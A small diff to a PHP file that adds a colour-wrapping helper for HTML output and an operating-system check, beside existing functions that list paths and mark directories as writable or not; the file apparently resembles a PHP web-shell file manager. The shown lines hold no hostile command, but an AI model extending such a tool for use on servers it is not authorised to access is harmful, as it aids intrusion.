@@ -591,6 +591,21 @@ function path() {
 	}
 	return $dir;
 }
+function color($bold = 1, $colorid = null, $string = null) {
+		$color = array(
+			"</font>",  			# 0 off
+			"<font color='red'>",	# 1 red 
+			"<font color='lime'>",	# 2 lime
+			"<font color='white'>",	# 3 white
+			"<font color='gold'>",	# 4 gold
+		);
+
+	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
+}
+
+function OS() {
+	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+}
 function w($dir,$perm) {
 	if(!is_writable($dir)) {
 		return "<font color=red>".$perm."</font>";
